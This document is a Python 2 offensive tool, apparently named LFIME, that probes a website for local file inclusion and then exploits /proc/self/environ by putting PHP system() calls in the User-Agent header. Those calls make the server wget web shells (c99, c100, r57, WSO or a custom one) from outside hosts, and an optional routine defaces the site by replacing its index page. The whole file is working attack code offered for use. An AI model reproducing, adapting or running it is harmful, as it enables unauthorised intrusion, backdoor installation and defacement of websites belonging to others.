import httplib
import urllib
import urllib2
import argparse

def deface(TARGET, SHELL, DEFACE, evil_url):
    print "\nEnter the name of the index file e.g. index.php"
    index_file = raw_input("> ")
    print "Give me the deface page txt url.. e.g. http://site.com/deface.txt"
    deface_txt = raw_input("> ")
    opener = urllib2.build_opener()
    opener.addheaders = [('User-agent', "<?system('wget "+deface_txt+" -O deface.php');?>")]
    response = opener.open(evil_url)
    opener.addheaders = [('User-agent', "<?system('mv "+index_file+" pwned.php');?>")]
    response = opener.open(evil_url)
    opener.addheaders = [('User-agent', "<?system('mv deface.php "+index_file+"');?>")]
    response = opener.open(evil_url)

def shell_upload(TARGET, SHELL, DEFACE, evil_url):
    print"""
Select the shell you want to upload

1. c99
2. c100
3. r57
4. WSO
5. Your shell
"""
    select = raw_input("> ")
    opener = urllib2.build_opener()
    if select == "1":
        opener.addheaders = [('User-agent', "<?system('http://www.r57shell.net/shell/c99.txt -O c99.php');?>")]
        response = opener.open(evil_url)
        print "\n[!] Shell successfully uploaded.."
        print "[!] Shell url: ", TARGET+"c99.php"
    elif select == "2":
        opener.addheaders = [('User-agent', "<?system('wget http://www.5njr.com/shells/c100.txt -O c100.php');?>")]
        response = opener.open(evil_url)
        print "\n[!] Shell successfully uploaded.."
        print "[!] Shell url: ", TARGET+"c100.php"
    elif select == "3":
        opener.addheaders = [('User-agent', "<?system('wget http://www.r57shell.net/shell/r57.txt -O r57.php');?>")]
        response = opener.open(evil_url)
        print "\n[!] Shell successfully uploaded.."
        print "[!] Shell url: ", TARGET+"r57.php"
    elif select == "4":
        opener.addheaders = [('User-agent', "<?system('wget http://files.xakep.biz/shells/PHP/wso.txt -O wso.php');?>")]
        response = opener.open(evil_url)
        print "\n[!] Shell successfully uploaded.."
        print "[!] Shell url: ", TARGET+"wso.php"
    elif select == "5":
        print "Give me the shell txt url.. e.g. http://site.com/shell.txt"
        shell_url = raw_input("> ")
        opener.addheaders = [('User-agent', "<?system('wget "+shell_url+" -O myevilshell.php');?>")]
        response = opener.open(evil_url)
        print "\n[!] Shell successfully uploaded.."
        print "[!] Shell url: ", TARGET+"myevilshell.php"
    if DEFACE != None:
        deface(TARGET, SHELL, DEFACE, evil_url)

def proc_self_environ_method(TARGET, SHELL, DEFACE):
    print "\n| Trying proc/self/environ method ..."
    print "| Now running a test ..."
    proc_self_environ_method_found = False
    LFI_FILE2 = open("procselfenviron.txt","r")
    lines = LFI_FILE2.readlines()
    for line in lines:
        url = TARGET+line
        response = urllib2.urlopen(TARGET+line)
        TARGET_source = response.read()
        if "DOCUMENT_ROOT" in TARGET_source:
            print "\n[!] The proc/self/environ method can be used ..."
            print "[!] Trying to upload a shell ..."
            proc_self_environ_method_found = True
            evil_url = TARGET+line
            shell_upload(TARGET, SHELL, DEFACE, evil_url)

def scanning_lfi(TARGET, SHELL, DEFACE):
    lfi_found = False
    LFI_FILE = open("lfi.txt", "r")
    lines = LFI_FILE.readlines()
    for line in lines:
        url = TARGET+line
        response = urllib2.urlopen(TARGET+line)
        TARGET_source = response.read()
        if "root" in TARGET_source:
            print "[!] Vulnerable to LFI"
            lfi_found = True
            break
        elif "/bin/" in TARGET_source:
            print "[!] Vulnerable to LFI"
            lfi_found = True
            break
        elif "bin/" in TARGET_source:
            print "[!] Vulnerable to LFI"
            lfi_found = True
            break
        elif "/bin" in TARGET_source:
            print "[!] Vulnerable to LFI"
            lfi_found = True
            break
        elif "/bash/" in TARGET_source:
            print "[!] Vulnerable to LFI"
            lfi_found = True
            break
        elif "bash/" in TARGET_source:
            print "[!] Vulnerable to LFI"
            lfi_found = True
            break
        elif "/bash" in TARGET_source:
            print "[!] Vulnerable to LFI"
            lfi_found = True
            break
        elif "/sbin/" in TARGET_source:
            print "[!] Vulnerable to LFI"
            lfi_found = True
            break
    if lfi_found == True:
        print "[!] Vulnerable url: ", TARGET+line
        if SHELL != None:
            proc_self_environ_method(TARGET, SHELL, DEFACE)
    else:
        print "[!] Not vulnerable to LFI.."
        print "[!] Shutting down.."

def remove_info(TARGET, SHELL, DEFACE):
    place = TARGET.index("=")
    TARGET = TARGET[:place+1]
    scanning_lfi(TARGET, SHELL, DEFACE)

def dns_check(TARGET, SHELL, DEFACE):
    connection = urllib2.urlopen(TARGET)
    response = connection.getcode()
    connection.close()
    if response == 200:
        print '| Site response: ', response
        print '| Scanning site ...\n'
        remove_info(TARGET, SHELL, DEFACE)
    elif response == 301:
        print '| Site response: ', response
        print '| Scanning site ...\n'
        remove_info(TARGET, SHELL, DEFACE)
    elif response == 302:
        print '| Site response: ', response
        print '| Scanning site ...\n'
        remove_info(TARGET, SHELL, DEFACE)
    else:
        print 'Exiting, because got response: ', response
        print 'Use -h switch for help'

def url_split(TARGET, SHELL, DEFACE):
    if "www." in TARGET:
        TARGET = TARGET.replace("www.","")
        dns_check(TARGET, SHELL, DEFACE)
        print TARGET
    elif "http://www." in TARGET:
        TARGET = TARGET.replace("http://www.","http://")
        print TARGET
        dns_check(TARGET, SHELL, DEFACE)
    else:
        dns_check(TARGET, SHELL, DEFACE)

def parseArgs():
    SHELL = None
    DEFACE = None
    parser = argparse.ArgumentParser()
    parser.add_argument("--url","--url", nargs="+", help="Target site e.g. http://www.site.com/index.php?page=contact.php")
    parser.add_argument("--shell","--shell", action='store_true', help="Shell to upload")
    parser.add_argument("--deface","--deface", action='store_true', help="Deface the target")
    args = parser.parse_args()
    if args.url:
        for url in args.url:
            TARGET = url
            if args.shell:
                SHELL = args.shell
            if args.deface:
                DEFACE = args.deface
            url_split(TARGET, SHELL, DEFACE)

def starting():
    print """
  LLLLL   FFFFFF IIIIII MMM   MMM EEEEEE
  LLLLL   FFFF     II   MMMM MMMM EEE
  LLLLL   FFFFFF   II   MMM M MMM EEEEEE
  LLLLL   FFFF     II   MMM   MMM EEE
  LLLLLLL FFFF   IIIIII MMM   MMM EEEEEE

  by c3nt3r~X [centerx@hotmail.gr]
  use -h switch for help
  """
    parseArgs()
    print "\n[!] For any bug contact me: centerx@hotmail.gr"
            
starting()
